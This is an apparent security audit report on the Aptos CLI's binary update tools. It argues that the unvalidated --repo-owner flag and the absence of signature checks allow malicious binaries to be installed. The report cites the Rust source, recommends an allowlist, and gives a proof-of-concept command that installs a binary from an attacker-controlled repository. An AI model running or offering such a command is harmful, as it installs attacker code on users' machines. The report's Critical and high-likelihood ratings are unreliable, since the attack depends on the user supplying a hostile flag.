# Audit Report

## Title
Supply Chain Attack via Unvalidated Repository Parameter in Binary Update Mechanism

## Summary
The Aptos CLI's binary update mechanism accepts arbitrary GitHub repository owners via the `--repo-owner` parameter without validation, signature verification, or user warnings. An attacker who can convince users to specify a malicious repository can deliver compromised binaries that execute with the user's privileges, leading to Remote Code Execution.

## Finding Description

The `FormatterUpdateTool` struct in the movefmt update module exposes a command-line parameter that allows users to override the default GitHub repository from which binaries are downloaded: [1](#0-0) 

This `repo_owner` parameter is passed directly to the binary download mechanism without any validation: [2](#0-1) 

The `build_updater` helper function accepts this parameter and passes it to the self_update crate's configuration without validation or verification: [3](#0-2) 

Critically, there is **no signature verification, checksum validation, or cryptographic attestation** of the downloaded binaries. Once installed, the binary is executed directly: [4](#0-3) 

The same vulnerability pattern exists in multiple update tools:
- `AptosUpdateTool` (the main CLI binary): [5](#0-4) 
- `RevelaUpdateTool`: [6](#0-5) 
- `MutationTestUpdaterTool`: [7](#0-6) 

## Impact Explanation

This vulnerability achieves **Critical Severity** under the "Remote Code Execution on validator node" category. If a validator operator is tricked into running the update command with a malicious repository parameter, an attacker gains arbitrary code execution with the operator's privileges, potentially leading to:

1. **Validator private key theft** - Compromising consensus security
2. **Blockchain state manipulation** - If the compromised binary is the main Aptos CLI
3. **Lateral movement** - Using the compromised machine to attack other infrastructure
4. **Supply chain poisoning** - If the compromised binary is distributed to other users

The vulnerability affects not just the movefmt tool but the entire binary update infrastructure, including the main Aptos CLI itself.

## Likelihood Explanation

While this vulnerability requires user interaction to override the default repository, the likelihood is **HIGH** due to several realistic attack vectors:

1. **Compromised documentation/tutorials** - Attackers could inject malicious commands into wikis, Stack Overflow, or community guides
2. **CI/CD pipeline injection** - Malicious scripts in automated build systems could include `--repo-owner` overrides
3. **Typosquatting in shell history** - Users copying commands with malicious parameters
4. **Phishing via official-looking communications** - Attackers impersonating Aptos Labs with "urgent update" instructions

The lack of any warning message when using non-default repositories exacerbates this risk.

## Recommendation

Implement a multi-layered defense:

1. **Binary Signature Verification**: Require cryptographic signatures on all distributed binaries and verify them before installation. Use a hardcoded public key to verify signatures.

2. **Repository Allowlist**: Restrict `repo_owner` to a hardcoded allowlist of trusted organizations:
```rust
const ALLOWED_REPO_OWNERS: &[&str] = &["aptos-labs", "movebit", "verichains", "eigerco"];

fn validate_repo_owner(repo_owner: &str) -> Result<()> {
    if !ALLOWED_REPO_OWNERS.contains(&repo_owner) {
        bail!("Repository owner '{}' is not in the trusted allowlist. Only {} are allowed.", 
              repo_owner, ALLOWED_REPO_OWNERS.join(", "));
    }
    Ok(())
}
```

3. **Prominent Warning for Custom Repositories**: If custom repositories must be supported, require an explicit `--allow-custom-repo` flag and display a prominent security warning.

4. **Checksum Verification**: At minimum, verify SHA256 checksums published alongside releases.

## Proof of Concept

**Attack Scenario:**

1. Attacker creates repository: `github.com/malicious-actor/movefmt`
2. Attacker uploads malicious binary disguised as movefmt v1.4.5 with keylogger/backdoor
3. Attacker distributes command via compromised tutorial: 
   ```bash
   aptos update movefmt --repo-owner malicious-actor --assume-yes
   ```
4. Victim executes command, downloading and installing malicious binary
5. When victim runs `aptos move fmt`, the malicious binary executes with victim's privileges
6. Attacker gains remote code execution, potentially stealing validator keys if victim is an operator

**Reproduction Steps:**
```bash
# Attacker preparation (requires GitHub account)
# 1. Create GitHub repo: malicious-actor/movefmt
# 2. Upload binary with malicious payload as release v1.4.5

# Victim execution
aptos update movefmt --repo-owner malicious-actor --assume-yes

# Malicious binary now installed at:
# ~/.aptos/bin/movefmt (or OS-specific location)

# Backdoor triggers on next format operation
aptos move fmt --package-path ./my-project
```

The attack succeeds because there is zero validation of the repository source and zero verification of binary authenticity.

---

**Notes:**

This vulnerability represents a critical gap in supply chain security for the Aptos CLI ecosystem. While the default repositories are trustworthy, the ability to silently substitute them without any security controls creates an exploitable attack surface. The impact is amplified because the same vulnerability pattern affects **all** binary update mechanisms in the CLI, including the ability to replace the Aptos CLI binary itself.

### Citations

**File:** crates/aptos/src/update/movefmt.rs (L27-29)
```rust
    /// The owner of the repo to download the binary from.
    #[clap(long, default_value = "movebit")]
    repo_owner: String,
```

**File:** crates/aptos/src/update/movefmt.rs (L102-114)
```rust
    fn build_updater(&self, info: &UpdateRequiredInfo) -> Result<Box<dyn ReleaseUpdate>> {
        build_updater(
            info,
            self.install_dir.clone(),
            self.repo_owner.clone(),
            self.repo_name.clone(),
            FORMATTER_BINARY_NAME,
            "unknown-linux-gnu",
            "apple-darwin",
            "windows",
            self.prompt_options.assume_yes,
        )
    }
```

**File:** crates/aptos/src/update/update_helper.rs (L67-77)
```rust
    Update::configure()
        .bin_install_dir(install_dir)
        .bin_name(binary_name)
        .repo_owner(&repo_owner)
        .repo_name(&repo_name)
        .current_version(current_version)
        .target_version_tag(&format!("v{}", info.target_version))
        .target(&target)
        .no_confirm(assume_yes)
        .build()
        .map_err(|e| anyhow!("Failed to build self-update configuration: {:#}", e))
```

**File:** crates/aptos/src/move_tool/fmt.rs (L81-89)
```rust
        let exe = get_movefmt_path()?;
        let package_opt = self.package_path;
        let config_path_opt = self.config_path;
        let files_opt = self.file_path;
        let config_map = self.config;
        let verbose_flag = self.verbose;
        let quiet_flag = self.quiet;
        let create_cmd = || {
            let mut cmd = Command::new(exe.as_path());
```

**File:** crates/aptos/src/update/aptos.rs (L33-35)
```rust
    /// The owner of the repo to download the binary from.
    #[clap(long, default_value = "aptos-labs")]
    repo_owner: String,
```

**File:** crates/aptos/src/update/revela.rs (L27-29)
```rust
    /// The owner of the repo to download the binary from.
    #[clap(long, default_value = "verichains")]
    repo_owner: String,
```

**File:** crates/aptos/src/update/move_mutation_test.rs (L27-29)
```rust
    /// The owner of the repo to download the binary from.
    #[clap(long, default_value = "eigerco")]
    repo_owner: String,
```
